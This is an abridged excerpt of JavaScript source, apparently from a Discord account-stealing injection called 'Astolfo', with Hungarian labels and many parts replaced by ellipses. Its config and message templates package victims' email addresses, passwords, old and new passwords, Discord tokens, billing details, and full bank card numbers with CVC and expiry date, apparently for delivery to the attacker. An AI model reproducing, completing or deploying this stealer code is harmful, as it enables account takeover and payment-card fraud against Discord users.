...
const config = {
  ...
  ping_val: '@everyone', 
  embed_name: 'Astolfo', 
  embed_icon: 'https://cdn.discordapp.com/attachments/990014876334321705/1137199526130765874/astolfo_ico.jpg', 
  embed_color: 0xFD95FF, 
    ...
    embeds: [
      {
        ...
        fields: [
          {
            name: '__**Fiók információk**__',
            value: `E-mail: **${email}** - Jelszó: **${password}**`,
            inline: false,
          },
          {
            name: '__**Discord információk**__',
            value: `Nitro típusa: **${nitro}**\nJelvények: **${badges}**\nSzámlázás: **${billing}**`,
            inline: false,
          },
          {
            name: '__**Token**__',
    ...
    embeds: [
      {
        ...
        fields: [
          {
            name: '__**Jelszó változott**__',
            value: `E-mail: **${json.email}**\nRégi jelszó: **${oldpassword}**\nÚj jelszó: **${newpassword}**`,
            inline: true,
          },
          {
            name: '__**Discord információk**__',
    ...
    embeds: [
      {
        ...
        fields: [
          {
            name: '__**E-mail változott**__',
            value: `Régi E-mail: **${email}**\nJelszó: **${password}**`,
            inline: true,
          },
          {
            name: '__**Discord információk**__',
    ...
    embeds: [
      {
        ...
        fields: [
          {
            name: '**PayPal hozzáadva**',
            value: `Itt az idő venni pár nitrót... 😩`,
            inline: false,
          },
          {
            name: '__**Discord információk**__',
    ...
    embeds: [
      {
        ...
        fields: [
          {
            name: '__**Bankkártya hozzáadva**__',
            value: `Bankkártya szám: **${number}**\nCVC: **${cvc}**\nLejárat: **${expir_month}/${expir_year}**`,
            inline: true,
          },
          {
            name: '__**Discord információk**__',
